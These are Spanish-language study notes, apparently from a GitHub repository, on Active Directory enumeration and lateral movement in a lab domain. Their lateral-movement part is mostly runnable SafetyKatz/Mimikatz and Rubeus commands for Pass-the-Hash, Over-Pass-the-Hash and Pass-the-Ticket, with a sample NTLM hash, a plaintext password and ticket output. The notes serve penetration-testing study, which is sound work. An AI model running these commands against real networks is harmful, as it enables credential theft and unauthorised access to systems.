## Tabla de contenido

- [Enumeración](#Enumeración).
- *[LogonSesssion](#LogonSesssion)*.
- [Token](#Token).
- [Movimiento_lateral](#Movimiento_lateral).
  - [runas](#runas).
  - *[Pass-the-Hash](#Pass-the-Hash)*.
  - *[Over-Pass-the-Hash](#Over-Pass-the-Hash)*.

# Enumeración
### Listar usuarios locales:
```powershell
Get-LocalUser
Get-WmiObject -Class win32_userprofile | select localpath, SID
```

### Listar usuarios del dominio:
```powershell
Get-ADUser -Filter *
Get-ADUser -Filter * -Server 192.168.1.155
```

### Listar grupos locales
```powershell
Get-LocalGroup
```

### Listar grupos del dominio
```powershell
Get-ADGroup -Filter *
Get-ADGroup -Filter * -Server 192.168.1.155
```
# *LogonSesssion*

Se crea cuando hay una autenticación sea de manera remota o local. Las credenciales siempre se asignan a una *logon session*.

![Ex00](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/1.png)

Hay dos tipos:

**(1) Interactivas**: las credenciales se almacenan en memoria (lsass.exe) para *Single Sign-On*.

**(2) No interactivas**: no se almacenan en memoria, solo se envían en la red. Por defecto **no se guardan en memoria**.
Ejmplo:

![Ex01](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/2.png)

Nota: aunque el usuario pepe puede consumir el recurso con permisos de lectura y escritura, si estas (credenciales) no se envían de manera explícita para consumir un recurso a través de SSO, no se podrá consumir el recurso.

# *Token*

Estructura de datos con información de seguridad de un usuario, gupos, identificar, etc.

![Ex02](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/3.png)

Con ello el sistema operativo, aplica controles de acceso a través de privilegios. Todos los objetos del sistema operativo Windows cuentan con descriptores de seguridad, allí está la lista **DACL** y en ella se especifica quién tiene acceso a los objetos.

![Ex03](https://github.com/0x04e1/Notas-Directorio-Activo/blob/main/Pic/4.png)

# Movimiento_lateral

## *runas*

Con credenciales válidas, es posible crear un proceso actuando como ese usuario.
- Aplica de manera local:
```powershell
runas.exe /user:ffff /savecred cmd.exe
```
- Aplica de manera remota:
```powershell
runas /noprofile /netonly /user:domain\Administrator powershell.exe
```

## *Pass-the-Hash*
1. Se crea una nueva sesión.
2. Se duplica el *token* original.
3. Se referencia la nueva sesión.
4. Se pueaplica al hilo principal o crear nuevo proceso y aplicarlo.

```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /run:powershell.exe" "exit"
```

Al contar con los paquetes de autenticación *msv1_0* y *kerberos*, es posible acceder el consumo de los servicios a través de NTLM y Kerberos (si el servidor lo soporta).
```powershell
msv1_0   - data copy @ 0000013DED28C5E0 : OK !
kerberos - data copy @ 0000013DECC9C6C8
```
## *Over-Pass-the-Hash*
1. Se crea una nueva sesión.
2. Se actualizan *hash* y/o llaves de la sesión.
3. Se copia el *token* original.
4. Similar a **runas /netonly** pero sin credenciales.

La técnica de *Over Pass the Hash* implica la generación de un nuevo ticket de Kerberos y la importación de este ticket en la memoria del sistema, lo cual generalmente requiere privilegios de administrador.
```powershell
C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /ptt"
```

En este caso, se agrega el parámetro **/ptt** al comando de *Pass the Hash* anterior. Esto indica a Mimikatz que importe el ticket de Kerberos generado en la memoria del sistema para establecer una sesión de autenticación en lugar de solo realizar un *Pass the Hash*. Esto permite realizar la técnica de *Over Pass the Hash* y obtener acceso a otros recursos o sistemas dentro de la red.

## Pass-the-Ticket

El parámetro "asktgt" en Rubeus, se utiliza para solicitar un Ticket Granting Ticket (TGT) utilizando las credenciales de un usuario especificado. Y es psoible realizarlo de manera remota:
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:cs.org\juan /password:Colombia.2023. /dc:192.168.1.155
# Para importar el *ticket*:
C:\AD\Tools\Rubeus.exe ptt /ticket:doIFDjCCBQqgAw...
```

## ASK-TGT/TGS

Se genera tráfico legítimo Kerberos para solicitar: AS-REQ TGS-REQ. ¡No necesita ser administrador!
Para solicitar el TGT concociendo el *Hash* del usuario: 
```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:juan /domain:cs.org /rc4:709d4242de780b1f34c19c78ad1630fd /dc:192.168.1.155 /ptt
```
Al listar el *ticket*, solo se tendrá el recién importado:
```powershell
#0>     Client: juan @ CS.ORG
        Server: krbtgt/cs.org @ CS.ORG
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 6/26/2024 12:35:32 (local)
        End Time:   6/26/2024 22:35:32 (local)
        Renew Time: 7/3/2024 12:35:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```
Al consumir el servicio CIF, se creará el TGS, Windows hará el trabajo.

```powershell
#2>     Client: juan @ CS.ORG
        Server: cifs/server-01 @ CS.ORG
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/26/2024 12:49:01 (local)
        End Time:   6/26/2024 22:48:51 (local)
        Renew Time: 7/3/2024 12:48:51 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called: SERVER-01.cs.org
```

Creando el TGS manualmente para consumir el sercio CIF:

```powershell
C:\AD\Tools\Rubeus.exe asktgs /ticket:doIFDj... /service:cifs/server-01.cs.org /ptt
# Al listar el *ticket* creado:
#0>     Client: juan @ CS.ORG
        Server: cifs/server-01.cs.org @ CS.ORG
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 6/26/2023 13:18:53 (local)
        End Time:   6/26/2023 20:08:43 (local)
        Renew Time: 7/3/2023 10:08:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

